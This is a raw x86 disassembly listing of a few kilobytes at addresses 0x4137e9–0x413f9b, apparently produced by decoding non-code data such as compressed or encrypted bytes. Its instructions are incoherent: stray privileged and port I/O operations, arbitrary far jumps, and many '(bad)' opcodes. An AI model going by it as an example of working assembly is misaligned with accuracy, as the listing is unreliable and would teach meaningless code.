  4137e9:	test   eax,0x85250208
  4137ee:	pop    ebx
  4137ef:	jo     0x41378b
  4137f1:	xchg   DWORD PTR [edi+0x765a1e6f],ebp
  4137f7:	mov    cl,0xe
  4137f9:	cs pop esp
  4137fb:	fild   QWORD PTR [ebx]
  4137fd:	push   edi
  4137fe:	add    eax,0xbef5c66
  413803:	inc    ecx
  413804:	adc    eax,0x473ce9c0
  413809:	bound  esi,QWORD PTR [edi-0x2a687169]
  41380f:	int3   
  413810:	mov    BYTE PTR [ebx],al
  413812:	inc    DWORD PTR [ecx+0x3d252696]
  413818:	inc    esp
  413819:	xchg   esp,eax
  41381a:	add    eax,0xb22d755f
  41381f:	out    dx,al
  413820:	and    DWORD PTR ds:0xdfd340d5,0x49
  413827:	push   eax
  413828:	ret    0xbca9
  41382b:	ror    DWORD PTR [eax-0x54],1
  41382e:	xor    eax,0x92bf1d46
  413833:	scas   eax,DWORD PTR es:[edi]
  413834:	sahf   
  413835:	push   esi
  413836:	sbb    al,0xbd
  413838:	shr    BYTE PTR [ebp+0x5d0e8724],0xfc
  41383f:	inc    ebp
  413840:	or     al,0x0
  413842:	dec    edx
  413843:	and    eax,0xf6783119
  413848:	shr    ebp,0xe7
  41384b:	test   al,0xa5
  41384d:	jge    0x413862
  41384f:	add    ecx,DWORD PTR [ecx-0x7d6321d7]
  413855:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413856:	test   DWORD PTR [esi+esi*1+0x7d],esp
  41385a:	int    0xe9
  41385c:	or     eax,DWORD PTR ds:0x18c0ddba
  413862:	sahf   
  413863:	sub    al,0x8c
  413865:	push   ebx
  413866:	or     al,0xd1
  413868:	and    DWORD PTR [edx+ebp*1-0x62],ebx
  41386c:	aad    0x9d
  41386e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41386f:	je     0x4138ec
  413871:	inc    esi
  413872:	xchg   ebp,eax
  413873:	sub    esi,eax
  413875:	mov    al,0xea
  413877:	adc    BYTE PTR [esi],cl
  413879:	jo     0x41384a
  41387b:	xchg   ecx,eax
  41387c:	(bad)  
  41387d:	push   ebx
  41387e:	neg    BYTE PTR [eax-0x1e2019ef]
  413884:	addr16 aaa 
  413886:	outs   dx,DWORD PTR ds:[esi]
  413887:	nop
  413888:	imul   esi,DWORD PTR [ebx],0xffffffd3
  41388b:	mov    eax,ds:0x3b203afe
  413890:	and    cl,BYTE PTR [ebp-0x76]
  413893:	ret    
  413894:	imul   ebx,ecx,0xd394c19a
  41389a:	bound  edi,QWORD PTR [ebp+0x41]
  41389d:	push   edi
  41389e:	cmp    DWORD PTR [esi],esp
  4138a0:	js     0x41388c
  4138a2:	add    cl,0x7
  4138a5:	aam    0x9e
  4138a7:	xchg   ecx,edi
  4138a9:	(bad)  
  4138ab:	cmc    
  4138ac:	push   ss
  4138ad:	in     eax,0x9a
  4138af:	mov    edx,0x111b0633
  4138b4:	repnz out 0x62,eax
  4138b7:	out    dx,al
  4138b8:	fidivr WORD PTR [edx]
  4138ba:	les    ecx,FWORD PTR [esi]
  4138bc:	push   ecx
  4138bd:	adc    cl,BYTE PTR [ebp+0x5ca14f0]
  4138c3:	idiv   BYTE PTR [esi+0x58822ab1]
  4138c9:	adc    al,0xe0
  4138cb:	cmp    eax,0x9116766d
  4138d0:	(bad)  [esi]
  4138d2:	jecxz  0x4138c3
  4138d4:	xchg   edi,edi
  4138d6:	lea    ebx,[eax+0x4c20d3e2]
  4138dc:	jbe    0x41387c
  4138de:	mov    eax,ds:0x8ec5b55e
  4138e3:	lahf   
  4138e4:	or     eax,0x214753d0
  4138e9:	or     eax,0x8ed8fabb
  4138ee:	dec    esp
  4138ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4138f0:	pop    eax
  4138f1:	pop    esp
  4138f2:	lock push es
  4138f4:	jo     0x4138c6
  4138f6:	add    ah,BYTE PTR [esi+ebx*1]
  4138f9:	add    eax,0x1e49bf4f
  4138fe:	and    al,0xe7
  413900:	out    dx,eax
  413901:	(bad)  
  413902:	pop    ss
  413903:	sub    BYTE PTR [esi+edi*2-0x4f501f19],ch
  41390a:	push   esi
  41390b:	addr16 or al,0xf6
  41390e:	clc    
  41390f:	aam    0x44
  413911:	ss push cs
  413913:	dec    ecx
  413914:	pushf  
  413915:	outs   dx,BYTE PTR ds:[esi]
  413916:	sub    cl,cl
  413918:	cli    
  413919:	push   0x40
  41391b:	add    BYTE PTR [ebp-0x52],bh
  41391e:	push   0xffffffa7
  413920:	jmp    0xc2d9:0x7ef16af1
  413927:	rcr    DWORD PTR [ebx+edi*1],1
  41392a:	jne    0x41394c
  41392c:	stos   DWORD PTR es:[edi],eax
  41392d:	addr16 xchg edx,eax
  41392f:	in     al,dx
  413930:	and    BYTE PTR [eax],cl
  413932:	adc    DWORD PTR [eax],0x79
  413935:	mov    al,ds:0x5a90c361
  41393a:	call   DWORD PTR [eax]
  41393c:	xchg   edx,eax
  41393d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41393e:	out    0xc3,al
  413940:	and    eax,DWORD PTR [eax+0xee7496b]
  413946:	jns    0x41390f
  413948:	mov    BYTE PTR [ebp-0x48],ah
  41394b:	mov    edx,DWORD PTR ds:0xdf46e62d
  413951:	bound  ebx,QWORD PTR [esi+0x271942ef]
  413957:	aas    
  413958:	pop    eax
  413959:	iret   
  41395a:	jp     0x413992
  41395c:	fst    DWORD PTR [eax+0x25ca704f]
  413962:	loopne 0x4139a5
  413964:	xchg   dl,bh
  413966:	loope  0x413966
  413968:	cmp    bh,BYTE PTR [ecx+0x796a409c]
  41396e:	iret   
  41396f:	push   esi
  413970:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413971:	jnp    0x4138fa
  413973:	fsubr  DWORD PTR [edx]
  413975:	aad    0xf2
  413977:	pop    ebx
  413978:	scas   al,BYTE PTR es:[edi]
  413979:	(bad)  
  41397a:	mov    cs,ebp
  41397c:	ret    
  41397d:	popa   
  41397e:	or     al,0x53
  413980:	dec    ebp
  413981:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413982:	xor    ch,cl
  413984:	clc    
  413985:	int    0x30
  413987:	jp     0x413960
  413989:	ins    DWORD PTR es:[edi],dx
  41398a:	xchg   DWORD PTR [ebx],ebp
  41398c:	loope  0x413964
  41398e:	lds    esi,FWORD PTR [edi]
  413990:	xor    esi,DWORD PTR [eax+0x27f8bc51]
  413996:	jb     0x4139fc
  413998:	adc    dh,0x3b
  41399b:	and    DWORD PTR [esi-0x15],0xffffff90
  41399f:	sbb    DWORD PTR ds:0x55e2b826,0x109919eb
  4139a9:	adc    ah,BYTE PTR [ebp+eiz*4+0x5]
  4139ad:	inc    esp
  4139ae:	cmp    BYTE PTR [edx+0x7f4361f9],ch
  4139b4:	aam    0x37
  4139b6:	mov    esp,DWORD PTR [eax-0x7]
  4139b9:	stos   BYTE PTR es:[edi],al
  4139ba:	mov    ecx,0xc834c7b2
  4139bf:	push   es
  4139c0:	pop    edx
  4139c1:	sar    DWORD PTR [edi+0x64],1
  4139c4:	inc    edx
  4139c5:	lods   eax,DWORD PTR ds:[esi]
  4139c6:	xor    bh,BYTE PTR [eax+0x1da48286]
  4139cc:	gs push 0xffffffb6
  4139cf:	pop    edi
  4139d0:	sahf   
  4139d1:	fimul  WORD PTR [ebx]
  4139d3:	not    BYTE PTR [eax]
  4139d5:	adc    ah,BYTE PTR [ebx+0xcda1029]
  4139db:	(bad)  
  4139dc:	(bad)  
  4139dd:	push   ebp
  4139de:	arpl   WORD PTR [edx-0xf],si
  4139e1:	in     al,dx
  4139e2:	mov    edx,es
  4139e4:	scas   al,BYTE PTR es:[edi]
  4139e5:	or     bh,BYTE PTR [edi]
  4139e7:	in     eax,0xa6
  4139e9:	xlat   BYTE PTR ds:[ebx]
  4139ea:	es ins BYTE PTR es:[edi],dx
  4139ec:	push   ds
  4139ed:	and    dl,BYTE PTR [ebx]
  4139ef:	in     al,dx
  4139f0:	jle    0x4139c7
  4139f2:	dec    ecx
  4139f3:	push   ds
  4139f4:	inc    eax
  4139f5:	iret   
  4139f6:	rol    DWORD PTR [eax-0x7b00e06b],1
  4139fc:	outs   dx,DWORD PTR ds:[esi]
  4139fd:	fimul  DWORD PTR [edx+0x62]
  413a00:	and    eax,0xeae407e5
  413a05:	gs addr16 es inc ecx
  413a09:	test   DWORD PTR [ebx+0x6c671106],0x6bc593df
  413a13:	and    al,0x37
  413a15:	or     al,0xe4
  413a17:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413a18:	xchg   BYTE PTR [esi+0x47],ch
  413a1b:	fidiv  WORD PTR [ebx-0x575f51a8]
  413a21:	(bad)  
  413a23:	div    DWORD PTR [eax+0x48559a4e]
  413a29:	std    
  413a2a:	xchg   esp,eax
  413a2b:	sub    eax,0xccc00059
  413a30:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413a31:	add    ch,dh
  413a33:	call   0xe4b9:0xb9d8a988
  413a3a:	xchg   edx,eax
  413a3b:	pop    ss
  413a3c:	pop    edx
  413a3d:	pop    ds
  413a3e:	out    0x10,al
  413a40:	leave  
  413a41:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413a42:	mov    eax,DWORD PTR [edx+0x14]
  413a45:	mov    bl,0x11
  413a47:	push   cs
  413a48:	loop   0x413a1d
  413a4a:	xchg   DWORD PTR [edi+0x365bc94f],esp
  413a50:	xchg   BYTE PTR [esi+ecx*2+0x489dfa45],cl
  413a57:	lods   al,BYTE PTR ds:[esi]
  413a59:	add    esp,ebx
  413a5b:	and    ah,dl
  413a5d:	cmp    al,0xab
  413a5f:	cmc    
  413a60:	imul   DWORD PTR [edx]
  413a62:	jno    0x413a75
  413a64:	push   ds
  413a65:	ret    
  413a66:	xchg   BYTE PTR [edi-0x6df24421],dh
  413a6c:	int    0x51
  413a6e:	cli    
  413a6f:	or     eax,0x7be9378c
  413a74:	mov    ss,WORD PTR [edx+0x2552191d]
  413a7a:	mov    bh,0xa0
  413a7c:	repz call 0xf0fddcd3
  413a82:	xchg   edx,eax
  413a83:	shl    BYTE PTR [ebx+ecx*8-0x776eefb6],cl
  413a8a:	lea    edi,[edi-0x26]
  413a8d:	sub    al,0x4e
  413a8f:	lods   eax,DWORD PTR ds:[esi]
  413a90:	popa   
  413a91:	in     eax,dx
  413a92:	cdq    
  413a93:	mov    ds:0xdb2cbeee,eax
  413a98:	daa    
  413a99:	inc    edx
  413a9a:	rcr    BYTE PTR [ecx+0xe5028d8],1
  413aa0:	shr    eax,1
  413aa2:	mov    dl,0x86
  413aa4:	(bad)
  413aa8:	in     eax,0xf7
  413aaa:	xchg   ch,al
  413aac:	imul   esp,DWORD PTR [esi],0x3
  413aaf:	xchg   esp,eax
  413ab0:	sbb    edx,DWORD PTR [esi]
  413ab2:	mov    edi,0x5f0084be
  413ab7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413ab8:	xchg   esi,eax
  413ab9:	dec    esi
  413aba:	ds jp  0x413aa4
  413abd:	(bad)  
  413abe:	aad    0x6b
  413ac0:	pop    ds
  413ac1:	mov    ah,0x62
  413ac3:	ret    0x5b5
  413ac6:	gs xor bl,BYTE PTR cs:[eax+0x5c]
  413acb:	arpl   WORD PTR ds:0x8fbb4c0b,sp
  413ad1:	xor    bl,dh
  413ad3:	test   DWORD PTR [edx+0x473aa7d1],ebx
  413ad9:	fadd   QWORD PTR [ecx]
  413adb:	mov    al,ds:0xd9ee22b5
  413ae0:	lods   al,BYTE PTR ds:[esi]
  413ae1:	push   DWORD PTR [ebp+0x137bb079]
  413ae7:	cdq    
  413ae8:	mov    BYTE PTR [eax+0x7b],al
  413aeb:	jno    0x413b5d
  413aed:	fisubr DWORD PTR [edx+ecx*4+0x4dbfea75]
  413af4:	jne    0x413b0a
  413af6:	push   edx
  413af7:	jecxz  0x413acb
  413af9:	xor    al,0x27
  413afb:	shl    DWORD PTR [ecx-0x8be3419],0x5c
  413b02:	sub    dl,BYTE PTR [edx]
  413b04:	arpl   WORD PTR [edx-0x37],di
  413b07:	outs   dx,DWORD PTR ds:[esi]
  413b08:	inc    esp
  413b09:	jg     0x413b0b
  413b0b:	shr    dl,0xa3
  413b0e:	pop    esi
  413b0f:	push   ss
  413b10:	and    bh,BYTE PTR [ecx+edi*4-0x61aa44d5]
  413b17:	js     0x413aa6
  413b19:	sbb    al,BYTE PTR [eax+0x367b87b]
  413b1f:	mov    bl,0x99
  413b21:	lds    edx,FWORD PTR [eax-0x69]
  413b24:	ret    
  413b25:	adc    dl,BYTE PTR [eax-0x69793c3f]
  413b2b:	popa   
  413b2c:	data16 jbe 0x413b44
  413b2f:	mov    BYTE PTR [ebp-0xf],al
  413b32:	add    dl,dh
  413b34:	imul   edx,esp,0x1e
  413b37:	inc    ecx
  413b38:	xchg   ebx,eax
  413b39:	dec    esp
  413b3a:	jno    0x413b3d
  413b3c:	lahf   
  413b3d:	pusha  
  413b3e:	fucom  st(2)
  413b40:	rcl    eax,0x45
  413b43:	fbld   TBYTE PTR [ebx+0x2f]
  413b46:	cmc    
  413b47:	shr    DWORD PTR [eax],0x8c
  413b4a:	aaa    
  413b4b:	or     al,0xf
  413b4d:	out    0xf8,eax
  413b4f:	(bad)  
  413b50:	mov    ah,0x3d
  413b52:	lods   eax,DWORD PTR ds:[esi]
  413b53:	xor    al,0x90
  413b55:	vpunpcklqdq xmm0,xmm1,XMMWORD PTR [edx]
  413b59:	pop    esp
  413b5a:	jbe    0x413b62
  413b5c:	add    ah,BYTE PTR [edx-0x300f4ca3]
  413b62:	sub    ch,BYTE PTR [ebx]
  413b64:	loop   0x413b75
  413b66:	daa    
  413b67:	fst    QWORD PTR [esi+0x70]
  413b6a:	mov    ecx,0xc5062f3a
  413b6f:	(bad)  
  413b71:	repnz pop eax
  413b73:	push   0x8e983a84
  413b78:	jb     0x413bef
  413b7a:	jnp    0x413b23
  413b7c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413b7d:	bound  esi,QWORD PTR [ebx+edi*2]
  413b80:	das    
  413b81:	mov    BYTE PTR [eax+0x1d],ch
  413b84:	aas    
  413b85:	mov    cl,0xf6
  413b87:	loope  0x413b3a
  413b89:	add    dl,BYTE PTR [edx-0x4f]
  413b8c:	or     eax,0x29103987
  413b91:	cdq    
  413b92:	bound  ebx,QWORD PTR [edx-0x7a03ad18]
  413b98:	pop    ss
  413b99:	xchg   ebp,eax
  413b9a:	sar    DWORD PTR [ebx],1
  413b9c:	mov    DWORD PTR [edi+eax*4+0xc284e34],ebx
  413ba3:	sbb    BYTE PTR [eax],bh
  413ba5:	mov    ds:0x73ee468d,eax
  413baa:	add    eax,0x5c66a77a
  413baf:	icebp  
  413bb0:	jg     0x413c19
  413bb2:	(bad)  
  413bb3:	aad    0x5d
  413bb5:	cli    
  413bb6:	sbb    eax,0xd8ac446a
  413bbb:	mov    ah,0x25
  413bbd:	test   DWORD PTR [eax],edi
  413bbf:	shl    al,1
  413bc1:	dec    ebx
  413bc2:	ins    DWORD PTR es:[edi],dx
  413bc3:	imul   edx,DWORD PTR [ecx],0xffffff9b
  413bc6:	pushf  
  413bc7:	jae    0x413b52
  413bc9:	xchg   esp,eax
  413bca:	lds    ebp,FWORD PTR [edx-0x6e]
  413bcd:	and    eax,DWORD PTR [edi+edx*1]
  413bd0:	retf   0x9067
  413bd3:	mov    edi,0x6d994f46
  413bd8:	lds    ecx,FWORD PTR [ecx]
  413bda:	jbe    0x413bd3
  413bdc:	push   ebx
  413bdd:	jnp    0x413bf8
  413bdf:	nop
  413be0:	pusha  
  413be1:	mov    esp,0x801becbc
  413be6:	(bad)  
  413be7:	scas   eax,DWORD PTR es:[edi]
  413be8:	pop    ds
  413be9:	cwde   
  413bea:	cmp    BYTE PTR [edi+0x25ab3a4d],al
  413bf0:	dec    ebx
  413bf1:	ins    BYTE PTR es:[edi],dx
  413bf2:	mov    WORD PTR [eax],es
  413bf4:	mov    al,BYTE PTR [edi+edx*8]
  413bf7:	xchg   ebp,eax
  413bf8:	or     ch,BYTE PTR [edi-0x4c7dba25]
  413bfe:	ds cli 
  413c00:	mov    esi,0xcc42b48f
  413c05:	mov    eax,ds:0x9a990f8f
  413c0a:	jns    0x413c59
  413c0c:	push   ebp
  413c0d:	sbb    BYTE PTR [edi+edx*2+0x14de2ce6],bh
  413c14:	shl    BYTE PTR [ebx],cl
  413c16:	popa   
  413c17:	dec    esp
  413c18:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413c19:	inc    ebp
  413c1a:	dec    ecx
  413c1b:	mov    edx,0xd15e3d04
  413c20:	stos   BYTE PTR es:[edi],al
  413c21:	fld    QWORD PTR ds:0x5514c6d
  413c27:	test   eax,0x6345ce92
  413c2c:	cmc    
  413c2d:	jp     0x413be3
  413c2f:	(bad)  
  413c32:	pop    esp
  413c33:	lds    eax,FWORD PTR ds:0x1c3c1481
  413c39:	mov    eax,0xf521a6c0
  413c3e:	cdq    
  413c3f:	cwde   
  413c40:	mov    ds:0x6398ee91,al
  413c45:	adc    BYTE PTR [edx],0x20
  413c48:	fdiv   QWORD PTR [eax+eax*1]
  413c4b:	in     eax,dx
  413c4c:	cmp    ch,ch
  413c4e:	sub    al,BYTE PTR [eax-0x477fbf03]
  413c54:	int    0xc6
  413c56:	iret   
  413c57:	mov    dl,0xe
  413c59:	and    al,0xb8
  413c5b:	push   edi
  413c5c:	jae    0x413c3a
  413c5e:	mov    edx,0x691e5d8e
  413c63:	ds in  eax,0x9a
  413c66:	sti    
  413c67:	in     al,0x27
  413c69:	in     eax,dx
  413c6a:	sbb    DWORD PTR [edx+0x70],edi
  413c6d:	cld    
  413c6e:	and    BYTE PTR [esi],bh
  413c70:	leave  
  413c71:	pop    edx
  413c72:	shl    DWORD PTR [esi],0x50
  413c75:	push   0x3a22f6ee
  413c7a:	in     al,dx
  413c7b:	imul   ecx,DWORD PTR [edx+eax*8],0x27d4e522
  413c82:	pop    esi
  413c83:	jp     0x413cdc
  413c85:	js     0x413c9b
  413c87:	dec    edi
  413c88:	mov    dh,0xce
  413c8a:	pop    eax
  413c8b:	test   esi,ebp
  413c8d:	rcl    DWORD PTR [edi-0x2],0xe
  413c91:	repz arpl WORD PTR [ebx],cx
  413c94:	ret    0x8bbd
  413c97:	test   DWORD PTR [edx-0x2d],ebp
  413c9a:	ins    BYTE PTR es:[edi],dx
  413c9b:	and    DWORD PTR [edi+0x3ca84b52],edx
  413ca1:	add    esi,ebp
  413ca3:	or     DWORD PTR [ebp-0x31],0x2876b941
  413caa:	and    al,0xef
  413cac:	icebp  
  413cad:	je     0x413c69
  413caf:	(bad)  
  413cb0:	fdiv   st,st(0)
  413cb2:	mov    edi,?
  413cb4:	mov    ebp,0x80f9c722
  413cb9:	sbb    al,0x5f
  413cbb:	mov    DWORD PTR [edx+0x12430735],esi
  413cc1:	aaa    
  413cc2:	or     ah,BYTE PTR [esi]
  413cc4:	cmp    dl,BYTE PTR [edi-0x197ee0f3]
  413cca:	mov    ecx,0xeca42888
  413ccf:	cmp    DWORD PTR [eax+0x5d],0x68
  413cd3:	add    bh,ch
  413cd5:	mov    edi,0x25a26f9e
  413cda:	sbb    ebp,DWORD PTR [esi]
  413cdc:	push   0xd542f90b
  413ce1:	in     al,dx
  413ce2:	dec    BYTE PTR [esi-0x12]
  413ce5:	mov    esp,0x7a8dd7ac
  413cea:	adc    ebx,DWORD PTR [eax-0x53151064]
  413cf0:	or     DWORD PTR [esi+0x658a31f5],edi
  413cf6:	popf   
  413cf7:	icebp  
  413cf8:	inc    ebx
  413cf9:	stc    
  413cfa:	sbb    DWORD PTR [ebx-0x40eb10e2],0xf
  413d01:	pop    edx
  413d02:	fdivr  QWORD PTR [esi]
  413d04:	enter  0xdcb4,0xa
  413d08:	fwait
  413d09:	inc    eax
  413d0a:	xor    al,BYTE PTR [eax]
  413d0c:	xor    esp,DWORD PTR [eax+esi*2]
  413d0f:	aaa    
  413d10:	stos   DWORD PTR es:[edi],eax
  413d11:	or     DWORD PTR [ebx-0x6e96199],esp
  413d17:	call   0x79ec:0x4d1f340b
  413d1e:	inc    esp
  413d1f:	xor    al,0xaf
  413d21:	push   esi
  413d22:	fsub   QWORD PTR [ecx+ebp*8+0x26]
  413d26:	push   ebx
  413d27:	daa    
  413d28:	aaa    
  413d29:	jge    0x413d0d
  413d2b:	mov    ecx,0xeda8126
  413d30:	ror    edi,cl
  413d32:	daa    
  413d33:	jbe    0x413cc2
  413d35:	mov    esp,0x92f34469
  413d3a:	mov    bl,0x21
  413d3c:	retf   0xd3f
  413d3f:	aam    0x15
  413d41:	rcl    al,0x3d
  413d44:	shr    BYTE PTR [edx+0x3713df68],cl
  413d4a:	push   esp
  413d4b:	scas   eax,DWORD PTR es:[edi]
  413d4c:	ins    DWORD PTR es:[edi],dx
  413d4d:	repnz mov eax,ds:0x503798b4
  413d53:	in     al,dx
  413d54:	mov    dl,0xc5
  413d56:	push   es
  413d57:	cmovle ecx,DWORD PTR [edx+esi*1-0x7f6a1e21]
  413d5f:	push   ds
  413d60:	aas    
  413d61:	xor    eax,0xf9d06cf
  413d66:	adc    eax,0x3985d6ef
  413d6b:	repnz add eax,0x902738e
  413d71:	push   ds
  413d72:	imul   ah
  413d74:	fwait
  413d75:	dec    eax
  413d76:	jmp    0xee7d:0x99169793
  413d7d:	pop    es
  413d7e:	mov    dh,0x2e
  413d80:	aas    
  413d81:	sub    esi,DWORD PTR [ecx]
  413d83:	jno    0x413d6a
  413d85:	mov    ds:0x8c06eb95,eax
  413d8a:	and    al,BYTE PTR [ecx+0x35]
  413d8d:	jl     0x413d2b
  413d8f:	xchg   ebx,eax
  413d90:	sub    ebx,DWORD PTR [edi-0x3d]
  413d93:	xlat   BYTE PTR ds:[ebx]
  413d94:	and    bh,BYTE PTR [ebx]
  413d96:	mov    ebx,0xa837f042
  413d9b:	inc    esi
  413d9c:	sti    
  413d9d:	shl    BYTE PTR [edx-0x61],0xd7
  413da1:	leave  
  413da2:	inc    eax
  413da3:	xchg   edx,eax
  413da4:	repnz inc ebx
  413da6:	mov    ah,0x66
  413da8:	in     al,dx
  413da9:	cmp    dh,BYTE PTR [esi]
  413dab:	pop    eax
  413dac:	nop
  413dad:	repnz xchg ebx,eax
  413daf:	sub    al,0xfd
  413db2:	sub    DWORD PTR [esi+edi*4],esp
  413db5:	inc    edi
  413db6:	adc    esp,DWORD PTR [ebx+0x6c]
  413db9:	inc    ebp
  413dba:	or     DWORD PTR [edi+0x75103668],esi
  413dc0:	jb     0x413d56
  413dc2:	cmp    edi,DWORD PTR [edi-0x4c5bd9b8]
  413dc8:	repnz in al,dx
  413dca:	(bad)  
  413dcb:	sbb    DWORD PTR [ebx-0x378adfd],edx
  413dd1:	retf   
  413dd2:	pop    esp
  413dd3:	xchg   BYTE PTR [eax],bl
  413dd5:	mov    BYTE PTR [edx+0x49],0x90
  413dd9:	ret    
  413dda:	mov    DWORD PTR [eax+0x74],ebp
  413ddd:	dec    esp
  413dde:	mov    cl,0xa4
  413de0:	mov    eax,ds:0x8a4fe5c2
  413de5:	dec    DWORD PTR [edx-0x37a8c3e]
  413deb:	mov    ah,0x25
  413ded:	jge    0x413de8
  413def:	mov    ah,0xf3
  413df1:	mov    bl,0x14
  413df3:	cmp    eax,0xb235fc34
  413df8:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  413dfa:	stos   DWORD PTR es:[edi],eax
  413dfb:	aaa    
  413dfc:	sahf   
  413dfd:	mov    esp,0xa3fa0e37
  413e02:	arpl   WORD PTR [edx+0x1cc05249],dx
  413e08:	xor    bl,BYTE PTR [ecx-0x2b]
  413e0b:	in     eax,0x18
  413e0d:	retf   0x3766
  413e10:	sub    esi,esp
  413e12:	repnz rol DWORD PTR [edi-0x23],1
  413e16:	call   0x23a9bc0f
  413e1b:	mov    al,ds:0x5684b98f
  413e20:	loopne 0x413db4
  413e22:	jmp    0x8b4c:0xcbe5b5b2
  413e29:	cmp    ecx,ebp
  413e2b:	mov    edx,DWORD PTR [edi]
  413e2d:	dec    ebp
  413e2e:	call   0x4947:0x44a13dd8
  413e35:	mov    dl,bl
  413e37:	addr16 inc edi
  413e39:	cmc    
  413e3a:	add    BYTE PTR [ebx+0x44],ah
  413e3d:	lods   eax,DWORD PTR ds:[esi]
  413e3e:	cmp    dh,BYTE PTR [edx+0x6a]
  413e41:	push   ds
  413e42:	pop    ss
  413e43:	lahf   
  413e44:	repz ret 0x9d21
  413e48:	ds aaa 
  413e4a:	cwde   
  413e4b:	or     eax,0xbf555337
  413e50:	push   ecx
  413e51:	inc    eax
  413e52:	int    0x81
  413e54:	fst    QWORD PTR [esp+edx*2]
  413e57:	aam    0x39
  413e59:	lock push ebx
  413e5b:	cmp    eax,0x6b19bdc8
  413e60:	into   
  413e61:	dec    edx
  413e62:	push   edx
  413e63:	aad    0xc0
  413e65:	and    BYTE PTR [edi+0x3f369889],bl
  413e6b:	enter  0x6898,0xfb
  413e6f:	rcr    BYTE PTR [esi+0x61],0xcd
  413e73:	push   edi
  413e74:	jne    0x413e3c
  413e76:	dec    ebp
  413e77:	mov    dl,0x22
  413e7a:	xchg   BYTE PTR ss:[ebp+ebp*4-0x699a67d1],cl
  413e82:	jbe    0x413e1b
  413e84:	xor    eax,0x34e32549
  413e89:	dec    esp
  413e8a:	jmp    0x3c33:0xb3b7997b
  413e91:	cs cmp al,0xd4
  413e94:	push   ebx
  413e95:	ja     0x413e99
  413e97:	into   
  413e98:	jno    0x413e30
  413e9a:	pop    ebx
  413e9b:	fldenv [ebx+0x6bff69c9]
  413ea1:	mov    bl,0xd9
  413ea3:	push   DWORD PTR [ecx-0x72]
  413ea6:	jecxz  0x413e6c
  413ea8:	int3   
  413ea9:	pop    ds
  413eaa:	mov    al,ds:0x665b211f
  413eaf:	cmp    DWORD PTR [edx],edi
  413eb1:	das    
  413eb2:	fld1   
  413eb4:	std    
  413eb5:	lds    edx,FWORD PTR [ecx]
  413eb7:	push   edi
  413eb8:	(bad)  
  413eb9:	lock repz gs ret 
  413ebd:	jno    0x413f0e
  413ebf:	inc    eax
  413ec0:	ss push ebx
  413ec2:	xor    al,0xcf
  413ec4:	push   0x60
  413ec6:	shl    BYTE PTR [ebp-0x75],1
  413ec9:	pushf  
  413eca:	cmovno edx,esi
  413ecd:	lods   al,BYTE PTR ds:[esi]
  413ece:	xor    BYTE PTR [edx+0x20],dh
  413ed1:	and    dl,BYTE PTR [eax-0x24]
  413ed4:	sti    
  413ed5:	jno    0x413ec4
  413ed7:	xchg   BYTE PTR [ecx],ah
  413ed9:	sti    
  413eda:	loopne 0x413ec7
  413edc:	cmp    eax,0xc5bbaf1
  413ee1:	test   eax,0x1c8da172
  413ee6:	andnps xmm5,XMMWORD PTR [ebp-0x74]
  413eea:	sbb    edx,eax
  413eec:	aad    0x64
  413eee:	xchg   ebp,eax
  413eef:	mov    ch,0x72
  413ef1:	out    0xe9,eax
  413ef3:	xchg   esi,eax
  413ef4:	or     eax,esi
  413ef6:	lods   al,BYTE PTR ds:[esi]
  413ef7:	and    al,0x6
  413ef9:	sahf   
  413efa:	arpl   WORD PTR [edx-0x6d9dac29],cx
  413f00:	clc    
  413f01:	jbe    0x413ef5
  413f03:	cli    
  413f04:	sbb    al,0x98
  413f06:	sti    
  413f07:	add    eax,0x1c8680c9
  413f0c:	es mov ch,0xe8
  413f0f:	je     0x413f8c
  413f11:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413f12:	fwait
  413f13:	ret    0xddf
  413f16:	mov    DWORD PTR [eax],0x9d9d814b
  413f1c:	(bad)  
  413f1d:	(bad)  
  413f1e:	hlt    
  413f1f:	inc    edi
  413f20:	add    eax,0x3025a210
  413f25:	lods   eax,DWORD PTR ds:[esi]
  413f26:	and    eax,edi
  413f28:	out    dx,al
  413f29:	stos   DWORD PTR es:[edi],eax
  413f2a:	jg     0x413f20
  413f2c:	pushf  
  413f2d:	push   es
  413f2e:	pop    esp
  413f2f:	hlt    
  413f30:	ins    DWORD PTR es:[edi],dx
  413f31:	mov    eax,ds:0xfc3fe618
  413f36:	aad    0x87
  413f38:	mov    ?,WORD PTR [ebp+0x272be602]
  413f3e:	xchg   esi,eax
  413f3f:	(bad)  
  413f40:	cmp    eax,0xfc035b0b
  413f45:	out    0x4f,al
  413f47:	sbb    BYTE PTR [ebx+ebx*1],0x61
  413f4b:	adc    BYTE PTR [ecx],ch
  413f4d:	loope  0x413f19
  413f4f:	adc    eax,DWORD PTR ss:[ebp+0x70e1c961]
  413f56:	outs   dx,DWORD PTR ds:[esi]
  413f57:	or     al,0xe6
  413f59:	lock mov cl,0x3a
  413f5c:	outs   dx,BYTE PTR ds:[esi]
  413f5d:	cmc    
  413f5e:	les    eax,FWORD PTR [ebp-0x1a085dc3]
  413f64:	and    eax,0x687ab5fc
  413f69:	stc    
  413f6a:	or     DWORD PTR [ebp+0x51a10e0d],ebx
  413f70:	imul   edi,DWORD PTR [ebx+0x25],0x7a42635a
  413f77:	rcr    BYTE PTR [esi-0x9],cl
  413f7a:	(bad)  
  413f7c:	cli    
  413f7d:	pop    esi
  413f7e:	inc    DWORD PTR [edx-0x3692b825]
  413f84:	and    al,0xcc
  413f86:	pop    eax
  413f87:	jno    0x413ff3
  413f89:	push   ebp
  413f8a:	push   ds
  413f8b:	das    
  413f8c:	inc    eax
  413f8d:	dec    edi
  413f8e:	mov    ebx,0xcc2ae684
  413f93:	dec    ecx
  413f94:	mov    dl,0x1c
  413f96:	mov    ebp,cs
  413f98:	popa   
  413f99:	addr16 cld 
  413f9b:	outs   dx,BYTE PTR ds:[esi]
